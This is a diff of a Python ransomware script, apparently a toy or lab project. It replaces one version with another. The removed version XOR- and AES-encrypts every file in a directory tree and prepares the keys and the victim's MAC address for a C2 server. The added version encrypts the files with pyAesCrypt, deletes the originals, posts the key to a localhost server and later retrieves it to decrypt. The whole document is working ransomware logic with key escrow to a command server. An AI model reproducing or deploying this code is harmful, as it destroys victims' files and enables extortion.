@@ -1,75 +1,60 @@
-#!/usr/bin/python3
-import requests
-import base64
-import urllib
-import hashlib
-import binascii
-import getmac
+import pyAesCrypt
+import pathlib
 import os
-import json
-from colored import fg, attr
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
-from Crypto import Random
-from Crypto.Random import get_random_bytes
+import secrets
+import getmac
+import requests
 
 
-class Ransomware:
-	def encrypt(self, file):
-		print("{}[+] encrypting -> {}{}".format(fg(9), file, attr(0)))
-		fd = open(file, "rb")
-		data = binascii.hexlify(fd.read())
-		fd.close()
-
-		# xor encryption
-		xored_data = b""
-		i = 0
-		while i < len(data):
-			xored_data += chr(data[i] ^ self.xor_key[i % len(self.xor_key)]).encode()
-			i += 1
-
-		# AES-256-CBC Encryption
-		cipher = AES.new(self.enc_key, AES.MODE_CBC, self.iv)
-		ciphertext = cipher.encrypt(pad(xored_data, AES.block_size))
-
-		# write encrypted file to disk
-		fd = open(file, "wb")
-		fd.write(ciphertext)
-		fd.close()
+def get_device_id():
+    eth_mac = getmac.get_mac_address(interface="eth0")
+    return eth_mac
 
 
-	def generate_keys(self):
-		# generate encryption keys
-		print("{}[*] generating encryption keys...{}".format(fg(10), attr(0)))
-		self.xor_key = binascii.hexlify(Random.new().read(AES.block_size - 8))
-		self.enc_key = hashlib.sha256(self.xor_key + Random.new().read(AES.block_size)).digest()
-		self.iv = Random.new().read(AES.block_size)
-		self.victim_mac_address = getmac.get_mac_address().encode()
-		self.save_keys()
+def fetch_files_in_dir(path):
+    return list(pathlib.Path(path).glob('*'))
 
 
-	def save_keys(self):
-		# send encryption keys to command and control (C2) server
-		print("{}[*] saving encryption keys to command and control (C2) server...{}".format(fg(10), attr(0)))
-		c2_url = "http://127.0.0.1:1337/save_keys"
-		data = {"mac_address": self.encode_keys(self.victim_mac_address), "enc_key": self.encode_keys(self.enc_key), "xor_key": self.encode_keys(self.xor_key), "iv": self.encode_keys(self.iv)}
-		with open('keys.json', 'w') as fp:
-			json.dump(data, fp, indent=4)
+class Ransomware():
+    """Base ransomware class"""
+
+    def __init__(self) -> None:
+        self.dir = './ransomware_test'
+        self.files_list = fetch_files_in_dir(self.dir)
+        self.server_url = 'http://127.0.0.1:5000/'
+        self.device_id = get_device_id()
+
+    def generate_key(self):
+        hash = secrets.token_hex(nbytes=128)
+        return hash
+
+    def encrypt(self):
+        password = self.generate_key()
+        server_url = self.server_url
+        data = {
+            'device_id': self.device_id,
+            'encryption_key': password
+        }
+        requests.post(server_url, json=data)
+        for item in self.files_list:
+            pyAesCrypt.encryptFile("./{}".format(item),
+                                   "./{}.aes".format(item), password)
+            os.remove('./{}'.format(item))
+        return
+
+    def decrypt(self):
+        updated_files_list = fetch_files_in_dir(self.dir)
+        data = {
+            'device_id': self.device_id
+        }
+        response = requests.get(self.server_url, json=data)
+        password = response.json().get('password')
+        for item in updated_files_list:
+            pyAesCrypt.decryptFile(
+                "./{}".format(item), "./{}".format(item).replace('.aes', ''), password)
+            os.remove('./{}'.format(item))
 
 
-	def dir_to_encrypt(self, dir_name):
-		self.generate_keys()
-		# what directory to encrypt
-		print("{}[*] encrypting '{}' directory{}".format(fg(10), dir_name, attr(0)))
-		for root, subdirs, files in os.walk(dir_name):
-			for file in files:
-				self.encrypt("{}/{}".format(root, file))
-
-
-	def encode_keys(self, key):
-		# encode keys before sending to C2 server
-		return urllib.parse.quote(base64.b64encode(key))
-
-
-ransom = Ransomware()
-ransom.dir_to_encrypt("./ransomeware_test")
+object = Ransomware()
+print(object.encrypt())
+print(object.decrypt())
